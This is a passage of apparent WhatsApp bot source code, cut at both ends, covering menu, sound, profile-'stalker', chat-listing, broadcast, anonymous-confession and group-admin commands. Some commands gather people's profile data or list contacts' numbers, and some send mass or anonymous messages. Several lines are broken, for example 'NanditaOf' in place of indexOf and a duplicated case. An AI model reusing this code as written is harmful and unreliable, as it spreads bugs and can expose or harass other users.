╔══ꪶEphoto360 Makerꫂ═══❀
║❒✗.glitchtext 
║❒✗.writetext 
║❒✗.advancedglow 
║❒✗.typographytext 
║❒✗.pixelglitch 
║❒✗.neonglitch 
║❒✗.flagtext 
║❒✗.flag3dtext 
║❒✗.deletingtext 
║❒✗.blackpinkstyle 
║❒✗.glowingtext 
║❒✗.underwatertext 
║❒✗.logomaker 
║❒✗.cartoonstyle 
║❒✗.papercutstyle 
║❒✗.watercolortext 
║❒✗.effectclouds 
║❒✗.blackpinklogo 
║❒✗.gradienttext 
║❒✗.summerbeach 
║❒✗.luxurygold 
║❒✗.multicoloredneon 
║❒✗.sandsummer 
║❒✗.galaxywallpaper 
║❒✗.1917style 
║❒✗.makingneon 
║❒✗.royaltext 
║❒✗.freecreate 
║❒✗.galaxystyle 
║❒✗.lighteffects 
╚═════════════════❀
 𝑴𝒂𝒅𝒆 𝑩𝒚 𝑫𝒓𝒆𝒂𝒎 𝑮𝒖𝒚 𝑫𝒆𝒆𝒑𝒂𝒌❤️ `
            let ments = [ownernya, me, mark]        
           DeepakBotInc.sendMessage(from, { 
text: deepakezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: false, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": false,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
          
break        
           
case 'allmenu': {
var unicorn = await getBuffer(picak+'All Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'othermenu': {
	var unicorn = await getBuffer(picak+'Other Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': {
var unicorn = await getBuffer(picak+'Download Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'groupmenu': {
var unicorn = await getBuffer(picak+'Group Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'funmenu': {
var unicorn = await getBuffer(picak+'Fun Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stalkermenu': {
var unicorn = await getBuffer(picak+'Stalker Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomphotomenu': {
var unicorn = await getBuffer(picak+'Random Pic Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${randphotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomvideomenu': {
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'textpromenu': {
var unicorn = await getBuffer(picak+'Textpro Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'photooxymenu': {
var unicorn = await getBuffer(picak+'Photooxy Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ephoto360menu': {
var unicorn = await getBuffer(picak+'Photo360 Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'nsfwmenu': {
var unicorn = await getBuffer(picak+'Anime NSFW Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'animemenu': {
var unicorn = await getBuffer(picak+'Anime Menu')
sendDeepakBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./DeepakMedia/theme/Zenitsu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
x_deepaktiktok = await getBuffer(`https://github.com/DGDEEPAK/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await DeepakBotInc.sendMessage(m.chat, { audio: x_deepaktiktok, mimetype: 'audio/mp4', ptt: true }, { quoted: m })                                      
break
case 'friend':
case 'searchfriend':{
if (!isPrem) return replyprem(mess.premium)
let teman = pickRandom(deepakverifieduser)
setTimeout(() => {
replygcdeepak(mess.wait)
}, 1000)
setTimeout(() => {
replygcdeepak('Managed to Get One Person')
}, 5000)
setTimeout(() => {
DeepakBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
me = m.sender
teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋 https://i.ibb.co/RjDcPYk/Zenitsu.jpg`
sendDeepakBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcdeepak('Reply the Message!!')
let deepakquotx= await DeepakBotInc.serializeM(await m.getQuotedObj())
if (!deepakquotx.quoted) return replygcdeepak('The message you are replying to is not sent by the bot')
await deepakquotx.quoted.copyNForward(m.chat, true)
}
break
         case 'tts': case 'say':{
         	if (!text) replygcdeepak(`Example : ${prefix + command} text`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             DeepakBotInc.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break
case 'igstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example ${prefix+command} unicorn_deepak`)
replygcdeepak(mess.wait)
aj = await igstalk(`${q}`)
DeepakBotInc.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example ${prefix+command} 946716486`)
replygcdeepak(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
replygcdeepak(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example ${prefix+command} 530793138|8129`)
replygcdeepak(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcdeepak(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return replygcdeepak(`Example ${prefix+command} xeonapi`)
replygcdeepak(mess.wait)
eha = await npmstalk.npmstalk(q)
replygcdeepak(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcdeepak(`Example ${prefix+command} DGDEEPAK`)
replygcdeepak(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
DeepakBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcdeepak(`Example ${prefix+command} link`)
replygcdeepak(mess.wait)
let krt = await scp1.ssweb(q)
DeepakBotInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!text) return replygcdeepak(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcdeepak('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await DeepakBotInc.groupAcceptInvite(result).then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcdeepak(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
DeepakBotInc.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
DeepakBotInc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcdeepak(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcdeepak(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 DeepakBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await DeepakBotInc.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 DeepakBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': case 'p': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcdeepak(respon)
            }
            break
case 'autosticker':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args[0] == 'on') {
if (autosticker) return replygcdeepak('*Activated!*')
autosticker = true
replygcdeepak('*Successfully Activated Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return replygcdeepak('*Not Yet Active!*')
autosticker = false
replygcdeepak('*Successfully Turn off Autosticker*')
} else {
replygcdeepak(`Type .autosticker on To Activate And .autosticker off To Deactivate`)
}
break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!DeepakTheCreator) return replygcdeepak(mess.owner)
		            if (!q) return replygcdeepak(`Enter text`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               DeepakBotInc.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!DeepakTheCreator) return replygcdeepak(mess.owner)
        if (!q) return replygcdeepak(`Enter text`)
        let getGroups = await DeepakBotInc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let deepakcast = groups.map(v => v.id)
        replygcdeepak(` Broadcasting in ${deepakcast.length} Group Chat, in ${deepakcast.length * 1.5} seconds`)
        for (let i of deepakcast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await DeepakBotInc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await DeepakBotInc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcdeepak(`Successfuly Broadcasted in ${deepakcast.length} Groups`)      
        break
case 'block': {
		if (!DeepakTheCreator) return replygcdeepak(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await DeepakBotInc.updateBlockStatus(users, 'block').then((res) => replygcdeepak(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!DeepakTheCreator) return replygcdeepak(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await DeepakBotInc.updateBlockStatus(users, 'unblock').then((res) => replygcdeepak(jsonformat(res))).catch((err) => replygcdeepak(jsonformat(err)))
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcdeepak(lisben)
	}
	break
case 'menfes': case 'confess':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return replygcdeepak("You are still in the room")
if (m.isGroup) return replygcdeepak(mess.private)
if (args.length < 1) return replygcdeepak(`Use ${prefix+command} number|your message\nExample ${prefix+command} ${ownernumber}|Hi Owner`)
if (text > 700) return replygcdeepak(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await DeepakBotInc.onWhatsApp(num)
if (cekno.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return replygcdeepak(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return replygcdeepak(`Can't Confess to bot number!!!`)
var nomor = m.sender

const deepakconfesmsg = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`

await DeepakBotInc.sendMessage(num,
{ text: deepakconfesmsg,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": ``,
"sourceUrl": `${wagc}`}}}, {quoted:m})

await DeepakBotInc.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : m })
lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return replygcdeepak(lidt)
}
break
case 'leave':{
if (m.isGroup && DeepakTheCreator && command == "leave") return DeepakBotInc.groupLeave(from)
if (m.isGroup) return replygcdeepak("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return replygcdeepak("You are not in the room")
replygcdeepak("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") DeepakBotInc.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
case 'afk': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!text) return replygcdeepak(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcdeepak(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
DeepakBotInc.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!DeepakTheCreator) return replygcdeepak(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                DeepakBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'editinfo': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!q) return replygcdeepak(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
DeepakBotInc.groupSettingUpdate(from, 'announcement')
replygcdeepak(`Success Allows Only Admins To Send Messages To This Group`)
} else if (args[0] == 'open') {
DeepakBotInc.groupSettingUpdate(from, 'not_announcement')
replygcdeepak(`Success Allows All Participants To Send Messages To This Group`)
} else {
replygcdeepak(`Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args.length < 1) return replygcdeepak('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcdeepak(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcdeepak('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.NanditaOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcdeepak('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return replygcdeepak(mess.group)
if (!isBotAdmins) return replygcdeepak(mess.botAdmin)
if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replygcdeepak('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcdeepak('Success in turning on antivirus in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcdeepak('Already deactivated')
let off = ntvirtex.NanditaOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcdeepak('Success in turning off antivirus this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'nsfw': {
